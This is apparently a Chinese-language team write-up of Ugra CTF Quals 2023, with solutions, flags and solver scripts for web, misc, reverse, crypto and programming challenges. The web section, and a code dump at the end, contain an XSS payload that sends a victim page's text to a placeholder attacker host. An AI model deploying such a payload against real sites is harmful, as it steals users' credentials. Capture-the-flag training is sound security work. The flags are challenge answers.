# Ugra CTF Quals 2023 WP

> 原文: https://www.ctfiot.com/92675.html
> ID: 92675

点击蓝字

关注我们

声明

本文作者：CTF战队本文字数：11042

阅读时长：约28分钟

附件/链接：点击查看原文下载

本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载

前言

比赛信息

WEB

Трисекция

flag总共有三部分，在源代码里面为第一部分

访问robots.txt可以发现路径

获得第二部分flag

第三部分在返回包中

Старые добрые времена

xss题目要求是需要管理员密码，应该是管理员会访问这个页面会收到服务器的链接，但是没能拿到 cookie。用户名密码在页面最上面或许是xss读这一部分

<script>window.open('http://xxx//xss.php?msg='+encodeURI(document.body.textContent))</script>

拿到了 ugra_stop_reinventing_the_wheel_gu1skdxq9p5m

Сельский блог

一个网站，说是有安全问题，但是暂未发现有用的信息 大概是需要看到里面的内容会跳转到订阅页面查看 burp 的数据包，看起来数据是从这里获取的查找内容发现 postidbase64 解密获得 flagugra_please_dont_read_it_you_didnt_pay_ye5lebug3cw2

Misc

Захват трафика

http流中发现了一个图片导出http流获取图片

ugra_traffic_extractor_43f693fbf875

Мультфильмы

命令行里面打开 这里需要用more或者其他命令打开，这个文件比较大

Музыкальная пятиминутка

下载音频 使用默认的win10 播放器可以看到缩略图中有内容，提取缩略图可以看到flag

Поле для сдачи флага

Бухгалтерия

里面是很多格子

解压资源未发现异常

发现有些内容是求和公式，全部替换后填充颜色ugra_you_asked_for_lattices_7kuc70y5quch

Reverse

Elementary

一个python脚本，对flag做出了限制，flag长度29位，第18位是字符6，前5位是ugra_

flag[9:3:-2]的意思是从flag[9]开始向前，步长为2，取3个字符，也就是第10，8，6位的字符是nta

flag[9]='n'
flag[7]='t'
flag[5]='a'

然后继续拆解这句

flag[-2:-15:-3].encode().hex() != '396e6b7367'

转换一下

for i in range(len(flag1)):
    print(chr(flag1[i]),end="")

得到

flag[27]='9'
flag[24]='n'
flag[21]='k'
flag[18]='s'
flag[15]='g'

继续看这句

flag[-4:].encode()) == b'aXo5aw=='

flag最后4位是

flag[28]='k'
flag[27]='9'
flag[26]='z'
flag[25]='i'

继续分析

int.from_bytes(flag[6:18:2].encode(), "little") == 104927802781555

int.from_byte(a.encode, “little”)的意思是将字符串的16进制反过来表示得到的整数

c=104927802781555
print(hex(c))
d=[0x5f,0x6e,0x68,0x69,0x6f,0x73]
for i in range(len(d)):
    print(chr(d[i]),end="")
e="s0ihn_"

得到

flag[6]='s'
flag[8]='o'
flag[10]='i'
flag[12]='h'
flag[14]='n'
flag[16]='_'

继续分析

sum(ord(x) * 1000 ** i for i, x in enumerate(flag[19:-4])) != 110112099107115106

这句是简单的乘法，乘以1000代表向前移3位，所以得到

flag[19]='j'
flag[20]='s'
flag[21]='k'
flag[22]='c'
flag[23]='p'
flag[24]='n'

把之前得到的各个位拼在一起，得到

ugra_astoni0h0ng_wsjskcpniz9k

还差flag[11]和flag[13]

import hashlib
import sys
flag=[0]*29
flag[17]='w'
flag[0]='u'
flag[1]='g'
flag[2]='r'
flag[3]='a'
flag[4]='_'
flag[9]='n'
flag[7]='t'
flag[5]='a'
flag[27]='9'
flag[24]='n'
flag[21]='k'
flag[18]='s'
flag[15]='g'
flag[28]='k'
flag[27]='9'
flag[26]='z'
flag[25]='i'
flag[6]='s'
flag[8]='o'
flag[10]='i'
flag[12]='h'
flag[14]='n'
flag[16]='_'
flag[19]='j'
flag[20]='s'
flag[21]='k'
flag[22]='c'
flag[23]='p'
flag[24]='n'
ss=""
for i in range(len(flag)):
    ss+=str(flag[i])
print(ss)
for i in range(32,127):
    for j in range(32, 127):
            flag[11]=chr(i)
            flag[13]=chr(j)
            # print(i,j)
            s = ''.join(flag)
            # print("开始")
            if (hashlib.sha256(s.encode()).hexdigest() == '8b488474de448c65a5a8571703bbcc71c4c5e347dca9a86e7277399e00c1e92d'):
                print(s)
                break

得到flag

ugra_astonishing_wsjskcpniz9k

Crypto

Водоворот

1337次rot13两两相互抵消，实际上解一次rot13可以得到flag

ugra_double_security_for_only_50_more_bucks_a16d9gf1gwot

Криптобаш

给了经过变换之后的key，按照其过程还原一下原始的key，最后得到的key是

from Crypto.Util.number import *
o='7faf9ada6e4f4add4b4fff4aeb3e5efada'
s=o[17:]+o[:17]
b='deadbeef'
a0=b*5
a0=a0[:
len(s)]
l=int(s,16)^int(a0,16)
print(long_to_bytes(int(l))[::-1])
#BJIxBGWyBQHmAJRj

Snipaste_2023-01-15_23-52-02.png

PPC

Глубина

简单编程，就是有很多一层一层的web目录，只有一条通往最深处，找到对的那条调试过程，因为网络不好不定时 500 加了个异常处理

import requests
import re

url = "https://depth.q.2023.ugractf.ru/4s026iq4j980bzas/"
r = requests.get(url)

reg1 = re.findall('<A HREF=.*?>',r.text)
for a in range(0,10000):
    try:
        for i in reg1:
            tmp_url = url
            i = i.replace("<A HREF=","")
            i = i.replace("/>","")
            tmp_url = tmp_url + i + "/"
            r2 = requests.get(tmp_url)
            if "HREF" in r2.text:
                url = tmp_url
                reg1 = re.findall('<A HREF=.*?>',r2.text)
                print(url+"n")
                break
    
except:
        pass

最后的路径

https://depth.q.2023.ugractf.ru/4s026iq4j980bzas/onyx_crab/unexpected_hail/desert_battery/explosive_saxophone/hidden_barnacle/unnecessary_case/ivory_python/obsidian_mermaid/jade_piano/jade_horn/wild_elk/blue_cottonmouth/amber_packet/agate_mare/coral_keyboard/coral_saxophone/ruby_nomad/space_battery/green_weapon/hidden_koala/wild_orca/revealing_tuba/orange_dragon/flying_warning/hunting_cartridge/scheming_device/amber_hammer/inconceivable_cobra/bad_pony/agate_compressor/jet_motherboard/searching_lion/insane_memory/untouchable_orca/coral_tape/flying_foal/urban_drill/urban_lobster/urban_snow/dangerous_trombone/beryl_memory/emerald_memory/chasing_zebra/ivory_viper/flying_sloth/pearl_transistor/green_foal/untouchable_network/uncanny_orca/urban_wildebeest/mountain_device/diamond_piano/nacre_cougar/space_rhythm/red_crab/mountain_hammerhead/jade_sloth/ivory_elk/bad_screwdriver/revealing_viper/bone_beat/spinning_banjo/wild_keyboard/space_lion/deadly_drizzle/bad_captain/chasing_hammer/chasing_griffin/unnecessary_sloth/stalking_tiger/untouchable_inspector/dangerous_yearling/deadly_cheetah/orbiting_troll/obsidian_mainframe/dangerous_case/yellow_weapon/obsidian_barnacle/chasing_cyborg/waning_cottonmouth/desert_tuba/dangerous_tuba/destroyed_cheetah/warring_major/threatening_falcon/nacre_sander/green_unicorn/space_presence/insane_pegasus/bone_presence/wireless_projector/hunting_mainframe/green_gelding/bone_horn/waning_yeti/coral_motherboard/chasing_warning/ivory_projector/glass_song/opal_octopus/hunting_trumpet/onyx_wrench/killer_hail/draconic_warning/chasing_case/obsidian_wildebeest/onyx_vacuum/bad_wrench/wild_trumpet/explosive_storm/green_clarinet/jade_zebra/uncanny_mask/unnecessary_cello/unknown_grizzly/untouchable_clarinet/deadly_elk/diamond_trumpet/inconceivable_jackal/bad_projector/sapphire_packet/diamond_griffin/red_thunder/unexpected_fairy/ruby_drought/decisive_song/decisive_lion/explosive_mainframe/violet_camera/decisive_cougar/mountain_griffin/decisive_gazelle/unknown_tiger/wireless_wildcat/explosive_gelding/flying_major/threatening_trumpet/yellow_storm/jade_commander/jade_drought/hidden_projector/sapphire_lobster/scheming_cello/rowdy_drill/urban_orca/diamond_griffin/revealing_motherboard/rowdy_piccolo/falling_clarinet/untouchable_sound/onyx_octopus/amber_mill/ivory_hammerhead/tarnished_falcon/orbiting_drill/bone_motherboard/orange_griffin/nacre_major/uncanny_cyborg/beryl_projector/orange_deer/bad_yearling/field_battery/uncanny_moose/revealing_drill/uncanny_stallion/mountain_mermaid/urban_cottonmouth/searching_mare/urban_orca/tundra_sander/inconceivable_beat/hidden_camera/emerald_hail/explosive_mill/orange_wizard/desert_lightning/nacre_device/unexpected_rhythm/violet_thunder/nacre_router/warring_sun/mountain_storm/searching_python/agate_cobra/tarnished_door/decisive_device/inconceivable_tiger/tundra_guitar/orbiting_battery/deadly_wrench/uncanny_mixer/sapphire_octopus/stalking_foal/deadly_barnacle/ruby_cobra/explosive_transistor/insane_cottonmouth/bone_cottonmouth/mountain_stag/flying_wildebeest/jade_tiger/wireless_lion/amber_grizzly/opal_mixer/insane_yearling/onyx_dragon/decisive_orca/unnecessary_banjo/unknown_sander/warring_organ/wild_wrench/revealing_warning/orange_lathe/hidden_keyboard/amber_harp/wild_nomad/ruby_colt/decisive_panther/inconceivable_motherboard/inconceivable_chain/diamond_keyboard/urban_mixer/green_commander/blue_leopard/warring_clarinet/insane_router/diamond_clarinet/searching_gazelle/green_trombone/ruby_captain/unexpected_packet/decisive_mermaid/beryl_panther/blue_horse/warring_router/space_warning/bone_snow/field_song/space_android/pearl_banjo/tundra_yeti/tarnished_pilot/covert_fairy/opal_android/hunting_mill/warring_wrench/red_chain/diamond_python/rowdy_cobra/decisive_welder/dangerous_falcon/beryl_screwdriver/explosive_trombone/glass_cup/spinning_keyboard/yellow_lion/agate_dragon/unknown_weapon/agate_drum/draconic_android/draconic_vacuum/tarnished_lion/untouchable_clarinet/insane_rhythm/warring_griffin/falling_cartridge/chasing_pegasus/waning_thunder/jet_cello/hunting_mixer/jade_screwdriver/hidden_sidewinder/field_screwdriver/field_warning/yellow_falcon/mountain_wizard/uncanny_drizzle/violet_door/inconceivable_wildcat/opal_chain/desert_banjo/unexpected_piranha/deadly_android/threatening_mare/spinning_hail/flying_harp/warring_harp/ivory_mill/opal_violin/draconic_memory/orange_yeti/emerald_sloth/opal_drum/unexpected_battery/explosive_hammer/onyx_mixer/deadly_rhythm/rowdy_general/space_piccolo/unknown_pony/searching_hammerhead/onyx_snow/hunting_filly/orange_lightning/obsidian_tiger/glass_ink/falling_colt/tarnished_falcon/threatening_wildcat/threatening_stag/decisive_filly/nacre_drizzle/threatening_battery/ivory_tape/pearl_drum/orbiting_hammerhead/searching_camera/unnecessary_network/nacre_yeti/orange_sander/yellow_zebra/beryl_general/stalking_tape/decisive_memory/diamond_orca/chasing_mermaid/orbiting_boa/obsidian_drizzle/desert_guitar/sapphire_mask/nacre_cornet/waning_drizzle/revealing_panther/orbiting_lobster/wireless_robot/spinning_cleric/falling_door/flying_stallion/spinning_trombone/orbiting_lion/onyx_tuba/searching_commander/yellow_lion/blue_screwdriver/chasing_warning/wireless_general/waning_warning/explosive_vacuum/killer_banjo/jade_inspector/blue_song/stalking_trombone/inconceivable_horn/obsidian_lion/orbiting_disk/jade_dragon/draconic_tuba/coral_chef/wireless_storm/insane_deer/blue_sun/waning_trombone/emerald_android/rowdy_leopard/deadly_wizard/beryl_griffin/falling_packet/insane_gazelle/uncanny_piranha/diamond_screwdriver/falling_cornet/mountain_harp/searching_wildebeest/desert_stag/beryl_lion/killer_captain/explosive_tuba/tundra_general/space_weapon/coral_wildebeest/bad_tuba/unexpected_falcon/agate_projector/field_welder/stalking_clarinet/amber_gelding/destroyed_drill/searching_projector/rowdy_storm/revealing_sloth/flying_rhythm/field_door/dangerous_stallion/ivory_cup/rowdy_storm/hunting_general/blue_guitar/agate_tape/destroyed_network/glass_horn/spinning_inspector/orange_pilot/yellow_gelding/falling_crab/glass_orca/violet_dragon/yellow_trombone/revealing_case/falling_leopard/opal_cougar/obsidian_device/nacre_sander/wild_python/onyx_harp/draconic_network/uncanny_foal/jade_robot/diamond_storm/killer_motherboard/obsidian_vacuum/ruby_mermaid/spinning_violin/uncanny_drill/bad_hail/flying_orca/revealing_robot/unnecessary_filly/destroyed_display/obsidian_warning/ruby_stag/onyx_hail/beryl_python/decisive_horse/dangerous_tiger/field_wrench/untouchable_mill/wild_stag/red_projector/nacre_device/beryl_tape/chasing_lion/bad_warning/pearl_welder/wild_sound/beryl_zebra/draconic_nomad/dangerous_griffin/bone_hammer/desert_hammer/space_player/desert_clarinet/warring_clarinet/revealing_clarinet/tundra_pilot/inconceivable_gelding/inconceivable_case/insane_wildebeest/wireless_cyborg/waning_stag/green_pegasus/mountain_jackal/blue_harp/hunting_horn/field_chef/chasing_cyborg/spinning_octopus/jet_rain/hunting_crab/mountain_stallion/field_zebra/searching_viper/bone_drizzle/green_stallion/diamond_grizzly/diamond_network/decisive_tape/blue_lobster/amber_welder/searching_yearling/hidden_battery/amber_thunder/explosive_harp/spinning_piccolo/urban_drum/tarnished_wildebeest/emerald_boa/rowdy_pony/hunting_cleric/space_orca/violet_general/scheming_elk/bone_storm/searching_hail/ivory_wrench/orbiting_saxophone/decisive_wrench/tarnished_filly/violet_device/jade_compressor/

ugra_i_have_always_imagined_that_paradise_will_be_a_kind_of_library_ghs7bmmuz4sf

后记

CTF战队正在招新！如果你也对CTF拥有非常浓厚的兴趣，欢迎加入我们！

团队招新！期待不一样的你~

作者

CTF战队

ctf.wgpsec.org

扫描关注公众号回复加群

和师傅们一起讨论研究~

长

按

关

注

WgpSec狼组安全团队

微信号：wgpsec

Twitter：@wgpsec


```
<script>window.open('http://xxx//xss.php?msg='+encodeURI(document.body.textContent))</script>
flag[9]='n'
flag[7]='t'
flag[5]='a'
flag[-2:-15:-3].encode().hex() != '396e6b7367'
for i in range(len(flag1)):
    print(chr(flag1[i]),end="")
flag[27]='9'
flag[24]='n'
flag[21]='k'
flag[18]='s'
flag[15]='g'
flag[-4:].encode()) == b'aXo5aw=='
flag[28]='k'
flag[27]='9'
flag[26]='z'
flag[25]='i'
int.from_bytes(flag[6:18:2].encode(), "little") == 104927802781555
c=104927802781555
print(hex(c))
d=[0x5f,0x6e,0x68,0x69,0x6f,0x73]
for i in range(len(d)):
    print(chr(d[i]),end="")
e="s0ihn_"
flag[6]='s'
flag[8]='o'
flag[10]='i'
flag[12]='h'
flag[14]='n'
flag[16]='_'
sum(ord(x) * 1000 ** i for i, x in enumerate(flag[19:-4])) != 110112099107115106
flag[19]='j'
flag[20]='s'
flag[21]='k'
flag[22]='c'
flag[23]='p'
flag[24]='n'
ugra_astoni0h0ng_wsjskcpniz9k
import hashlib
import sys
flag=[0]*29
flag[17]='w'
flag[0]='u'
flag[1]='g'
flag[2]='r'
flag[3]='a'
flag[4]='_'
flag[9]='n'
flag[7]='t'
flag[5]='a'
flag[27]='9'
flag[24]='n'
flag[21]='k'
flag[18]='s'
flag[15]='g'
flag[28]='k'
flag[27]='9'
flag[26]='z'
flag[25]='i'
flag[6]='s'
flag[8]='o'
flag[10]='i'
flag[12]='h'
flag[14]='n'
flag[16]='_'
flag[19]='j'
flag[20]='s'
flag[21]='k'
flag[22]='c'
flag[23]='p'
flag[24]='n'
ss=""
for i in range(len(flag)):
    ss+=str(flag[i])
print(ss)
for i in range(32,127):
    for j in range(32, 127):
            flag[11]=chr(i)
            flag[13]=chr(j)
            # print(i,j)
            s = ''.join(flag)
            # print("开始")
            if (hashlib.sha256(s.encode()).hexdigest() == '8b488474de448c65a5a8571703bbcc71c4c5e347dca9a86e7277399e00c1e92d'):
                print(s)
                break
ugra_astonishing_wsjskcpniz9k
ugra_double_security_for_only_50_more_bucks_a16d9gf1gwot
from Crypto.Util.number import *
o='7faf9ada6e4f4add4b4fff4aeb3e5efada'
s=o[17:]+o[:17]
b='deadbeef'
a0=b*5
a0=a0[:
len(s)]
l=int(s,16)^int(a0,16)
print(long_to_bytes(int(l))[::-1])
#BJIxBGWyBQHmAJRj
import requests
import re

url = "https://depth.q.2023.ugractf.ru/4s026iq4j980bzas/"
r = requests.get(url)

reg1 = re.findall('<A HREF=.*?>',r.text)
for a in range(0,10000):
    try:
        for i in reg1:
            tmp_url = url
            i = i.replace("<A HREF=","")
            i = i.replace("/>","")
            tmp_url = tmp_url + i + "/"
            r2 = requests.get(tmp_url)
            if "HREF" in r2.text:
                url = tmp_url
                reg1 = re.findall('<A HREF=.*?>',r2.text)
                print(url+"n")
                break
    
except:
        pass
https://depth.q.2023.ugractf.ru/4s026iq4j980bzas/onyx_crab/unexpected_hail/desert_battery/explosive_saxophone/hidden_barnacle/unnecessary_case/ivory_python/obsidian_mermaid/jade_piano/jade_horn/wild_elk/blue_cottonmouth/amber_packet/agate_mare/coral_keyboard/coral_saxophone/ruby_nomad/space_battery/green_weapon/hidden_koala/wild_orca/revealing_tuba/orange_dragon/flying_warning/hunting_cartridge/scheming_device/amber_hammer/inconceivable_cobra/bad_pony/agate_compressor/jet_motherboard/searching_lion/insane_memory/untouchable_orca/coral_tape/flying_foal/urban_drill/urban_lobster/urban_snow/dangerous_trombone/beryl_memory/emerald_memory/chasing_zebra/ivory_viper/flying_sloth/pearl_transistor/green_foal/untouchable_network/uncanny_orca/urban_wildebeest/mountain_device/diamond_piano/nacre_cougar/space_rhythm/red_crab/mountain_hammerhead/jade_sloth/ivory_elk/bad_screwdriver/revealing_viper/bone_beat/spinning_banjo/wild_keyboard/space_lion/deadly_drizzle/bad_captain/chasing_hammer/chasing_griffin/unnecessary_sloth/stalking_tiger/untouchable_inspector/dangerous_yearling/deadly_cheetah/orbiting_troll/obsidian_mainframe/dangerous_case/yellow_weapon/obsidian_barnacle/chasing_cyborg/waning_cottonmouth/desert_tuba/dangerous_tuba/destroyed_cheetah/warring_major/threatening_falcon/nacre_sander/green_unicorn/space_presence/insane_pegasus/bone_presence/wireless_projector/hunting_mainframe/green_gelding/bone_horn/waning_yeti/coral_motherboard/chasing_warning/ivory_projector/glass_song/opal_octopus/hunting_trumpet/onyx_wrench/killer_hail/draconic_warning/chasing_case/obsidian_wildebeest/onyx_vacuum/bad_wrench/wild_trumpet/explosive_storm/green_clarinet/jade_zebra/uncanny_mask/unnecessary_cello/unknown_grizzly/untouchable_clarinet/deadly_elk/diamond_trumpet/inconceivable_jackal/bad_projector/sapphire_packet/diamond_griffin/red_thunder/unexpected_fairy/ruby_drought/decisive_song/decisive_lion/explosive_mainframe/violet_camera/decisive_cougar/mountain_griffin/decisive_gazelle/unknown_tiger/wireless_wildcat/explosive_gelding/flying_major/threatening_trumpet/yellow_storm/jade_commander/jade_drought/hidden_projector/sapphire_lobster/scheming_cello/rowdy_drill/urban_orca/diamond_griffin/revealing_motherboard/rowdy_piccolo/falling_clarinet/untouchable_sound/onyx_octopus/amber_mill/ivory_hammerhead/tarnished_falcon/orbiting_drill/bone_motherboard/orange_griffin/nacre_major/uncanny_cyborg/beryl_projector/orange_deer/bad_yearling/field_battery/uncanny_moose/revealing_drill/uncanny_stallion/mountain_mermaid/urban_cottonmouth/searching_mare/urban_orca/tundra_sander/inconceivable_beat/hidden_camera/emerald_hail/explosive_mill/orange_wizard/desert_lightning/nacre_device/unexpected_rhythm/violet_thunder/nacre_router/warring_sun/mountain_storm/searching_python/agate_cobra/tarnished_door/decisive_device/inconceivable_tiger/tundra_guitar/orbiting_battery/deadly_wrench/uncanny_mixer/sapphire_octopus/stalking_foal/deadly_barnacle/ruby_cobra/explosive_transistor/insane_cottonmouth/bone_cottonmouth/mountain_stag/flying_wildebeest/jade_tiger/wireless_lion/amber_grizzly/opal_mixer/insane_yearling/onyx_dragon/decisive_orca/unnecessary_banjo/unknown_sander/warring_organ/wild_wrench/revealing_warning/orange_lathe/hidden_keyboard/amber_harp/wild_nomad/ruby_colt/decisive_panther/inconceivable_motherboard/inconceivable_chain/diamond_keyboard/urban_mixer/green_commander/blue_leopard/warring_clarinet/insane_router/diamond_clarinet/searching_gazelle/green_trombone/ruby_captain/unexpected_packet/decisive_mermaid/beryl_panther/blue_horse/warring_router/space_warning/bone_snow/field_song/space_android/pearl_banjo/tundra_yeti/tarnished_pilot/covert_fairy/opal_android/hunting_mill/warring_wrench/red_chain/diamond_python/rowdy_cobra/decisive_welder/dangerous_falcon/beryl_screwdriver/explosive_trombone/glass_cup/spinning_keyboard/yellow_lion/agate_dragon/unknown_weapon/agate_drum/draconic_android/draconic_vacuum/tarnished_lion/untouchable_clarinet/insane_rhythm/warring_griffin/falling_cartridge/chasing_pegasus/waning_thunder/jet_cello/hunting_mixer/jade_screwdriver/hidden_sidewinder/field_screwdriver/field_warning/yellow_falcon/mountain_wizard/uncanny_drizzle/violet_door/inconceivable_wildcat/opal_chain/desert_banjo/unexpected_piranha/deadly_android/threatening_mare/spinning_hail/flying_harp/warring_harp/ivory_mill/opal_violin/draconic_memory/orange_yeti/emerald_sloth/opal_drum/unexpected_battery/explosive_hammer/onyx_mixer/deadly_rhythm/rowdy_general/space_piccolo/unknown_pony/searching_hammerhead/onyx_snow/hunting_filly/orange_lightning/obsidian_tiger/glass_ink/falling_colt/tarnished_falcon/threatening_wildcat/threatening_stag/decisive_filly/nacre_drizzle/threatening_battery/ivory_tape/pearl_drum/orbiting_hammerhead/searching_camera/unnecessary_network/nacre_yeti/orange_sander/yellow_zebra/beryl_general/stalking_tape/decisive_memory/diamond_orca/chasing_mermaid/orbiting_boa/obsidian_drizzle/desert_guitar/sapphire_mask/nacre_cornet/waning_drizzle/revealing_panther/orbiting_lobster/wireless_robot/spinning_cleric/falling_door/flying_stallion/spinning_trombone/orbiting_lion/onyx_tuba/searching_commander/yellow_lion/blue_screwdriver/chasing_warning/wireless_general/waning_warning/explosive_vacuum/killer_banjo/jade_inspector/blue_song/stalking_trombone/inconceivable_horn/obsidian_lion/orbiting_disk/jade_dragon/draconic_tuba/coral_chef/wireless_storm/insane_deer/blue_sun/waning_trombone/emerald_android/rowdy_leopard/deadly_wizard/beryl_griffin/falling_packet/insane_gazelle/uncanny_piranha/diamond_screwdriver/falling_cornet/mountain_harp/searching_wildebeest/desert_stag/beryl_lion/killer_captain/explosive_tuba/tundra_general/space_weapon/coral_wildebeest/bad_tuba/unexpected_falcon/agate_projector/field_welder/stalking_clarinet/amber_gelding/destroyed_drill/searching_projector/rowdy_storm/revealing_sloth/flying_rhythm/field_door/dangerous_stallion/ivory_cup/rowdy_storm/hunting_general/blue_guitar/agate_tape/destroyed_network/glass_horn/spinning_inspector/orange_pilot/yellow_gelding/falling_crab/glass_orca/violet_dragon/yellow_trombone/revealing_case/falling_leopard/opal_cougar/obsidian_device/nacre_sander/wild_python/onyx_harp/draconic_network/uncanny_foal/jade_robot/diamond_storm/killer_motherboard/obsidian_vacuum/ruby_mermaid/spinning_violin/uncanny_drill/bad_hail/flying_orca/revealing_robot/unnecessary_filly/destroyed_display/obsidian_warning/ruby_stag/onyx_hail/beryl_python/decisive_horse/dangerous_tiger/field_wrench/untouchable_mill/wild_stag/red_projector/nacre_device/beryl_tape/chasing_lion/bad_warning/pearl_welder/wild_sound/beryl_zebra/draconic_nomad/dangerous_griffin/bone_hammer/desert_hammer/space_player/desert_clarinet/warring_clarinet/revealing_clarinet/tundra_pilot/inconceivable_gelding/inconceivable_case/insane_wildebeest/wireless_cyborg/waning_stag/green_pegasus/mountain_jackal/blue_harp/hunting_horn/field_chef/chasing_cyborg/spinning_octopus/jet_rain/hunting_crab/mountain_stallion/field_zebra/searching_viper/bone_drizzle/green_stallion/diamond_grizzly/diamond_network/decisive_tape/blue_lobster/amber_welder/searching_yearling/hidden_battery/amber_thunder/explosive_harp/spinning_piccolo/urban_drum/tarnished_wildebeest/emerald_boa/rowdy_pony/hunting_cleric/space_orca/violet_general/scheming_elk/bone_storm/searching_hail/ivory_wrench/orbiting_saxophone/decisive_wrench/tarnished_filly/violet_device/jade_compressor/
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/6-1673874000.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/9-1673874000.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/1-1673874001.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/3-1673874002.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/10-1673874002.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/10-1673874002.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/0-1673874002.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/9-1673874003.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/1-1673874003.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/2-1673874004.png)